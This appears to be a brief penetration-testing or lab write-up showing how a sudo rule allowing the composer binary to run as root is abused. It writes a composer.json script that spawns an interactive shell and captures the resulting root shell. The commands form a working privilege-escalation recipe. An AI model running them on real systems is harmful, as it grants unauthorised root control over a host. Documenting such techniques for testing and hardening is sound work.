# composer

---

When we can run the composer binary with sudo permissions we can easily get root privs.

## PoC


```
skunk@debian:/var/www/html/lavita$ sudo -l
Matching Defaults entries for skunk on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User skunk may run the following commands on debian:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *
```

Analyzing the composer binary on gtfobins. We can see that there is an PoC existing for sudo permissions.

```
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
sudo composer --working-dir=/var/www/html/lavita x
```

This creates an malicious script called "x" and puts it inside the /var/www/html/lavita/composer.json file.

We can then run composer with sudo perms to achieve root perms.

```
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
```

Executed the "x" script.

```
skunk@debian:/$ sudo composer --working-dir=/var/www/html/lavita x
Do not run Composer as root/super user! See https://getcomposer.org/root for details
Continue as root/super user [yes]? yes
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
root
```
